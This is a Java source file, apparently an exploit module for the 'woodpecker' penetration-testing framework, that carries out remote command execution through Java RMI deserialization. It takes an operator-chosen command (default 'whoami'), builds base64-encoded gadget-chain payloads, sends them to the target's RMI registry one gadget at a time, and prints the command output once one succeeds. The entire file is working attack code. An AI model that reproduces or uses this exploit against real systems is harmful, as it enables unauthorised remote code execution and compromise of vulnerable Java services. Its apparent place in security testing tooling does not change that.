package me.gv7.woodpecker.plugin.exploit;

import me.gv7.woodpecker.plugin.*;
import me.gv7.woodpecker.plugin.utils.CommonUtil;
import me.gv7.woodpecker.plugin.utils.RMIRegistryExploit;
import sun.misc.BASE64Encoder;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;

public class RmiDeserialExecExploit implements IExploit {
    @Override
    public String getExploitTabCaption() {
        return "Rmi 反序列化命令执行";
    }

    @Override
    public List<IArgs> getExploitCutomArgs() {
        IArgs args = JavaRMIVulPlugin.pluginHelper.createArgs();
        args.setDescription("命令");
        args.setMastSetup(true);
        args.setDefaultValue("whoami");
        args.setName("command");

        List<IArgs> argsList = new ArrayList<IArgs>();
        argsList.add(args);

        return argsList;
    }

    @Override
    public void doExploit(ITarget target, Map<String, String> map, IResultOutput result) {
        String host = target.getHost();
        int port = target.getPort();

        for(String gadget: JavaRMIVulPlugin.gadgets){
            try {
                result.rawPrintln(String.format("[-] try gadget:%s\n",gadget));
                String command = map.get("command");
                String bcelStr = CommonUtil.getEchoExeCode(command);
                bcelStr = new BASE64Encoder().encode(bcelStr.getBytes());
                String res = null;
                try {
                    Object objPayload = CommonUtil.generator(gadget, String.format("codebase64:%s", bcelStr));
                    if (objPayload == null) {
                        continue;
                    }
                    res = RMIRegistryExploit.sendPayload(host, port, objPayload);
                } catch (Throwable e) {
                    e.printStackTrace();
                }
                if (res != null) {
                    result.successPrintln(String.format("[+] Gadget:%s\n[+] Exec %s result:\n%s\n", gadget, command, res));
                    break;
                }
            }catch (Exception e){
                e.printStackTrace();
            }
        }
    }
}
